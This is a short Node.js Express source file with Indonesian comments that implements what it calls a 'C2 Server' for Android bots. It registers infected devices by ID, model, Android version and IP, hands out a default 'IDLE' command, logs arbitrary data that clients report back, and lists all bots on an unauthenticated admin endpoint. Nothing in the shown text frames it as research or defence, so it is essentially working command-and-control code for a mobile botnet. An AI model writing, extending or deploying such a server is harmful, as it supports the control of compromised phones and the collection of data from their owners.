const express = require('express');
const bodyParser = require('body-parser');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

let connectedBots = [];

// Endpoint Registrasi Bot
app.post('/api/register', (req, res) => {
    const { deviceId, androidVersion, model } = req.body;
    const botData = {
        id: deviceId || Math.random().toString(36).substring(7),
        androidVersion: androidVersion || 'Unknown',
        model: model || 'Unknown',
        lastSeen: new Date(),
        ip: req.ip
    };
    connectedBots.push(botData);
    console.log(`[+] Bot baru terhubung: ${botData.id} (${botData.model})`);
    res.status(200).json({ status: 'success', message: 'Registered successfully', command: 'IDLE' });
});

// Endpoint Laporan Data
app.post('/api/report', (req, res) => {
    const data = req.body;
    console.log('[!] Menerima data laporan dari klien:', JSON.stringify(data, null, 2));
    res.status(200).json({ status: 'received' });
});

// Endpoint Admin untuk Melihat Daftar Bot (TAMBAHKAN INI)
app.get('/admin/bots', (req, res) => {
    res.status(200).json({
        total_bots: connectedBots.length,
        bots: connectedBots
    });
});

// Jalankan Server
app.listen(PORT, () => {
    console.log(`[*] C2 Server berjalan pada port ${PORT}`);
});
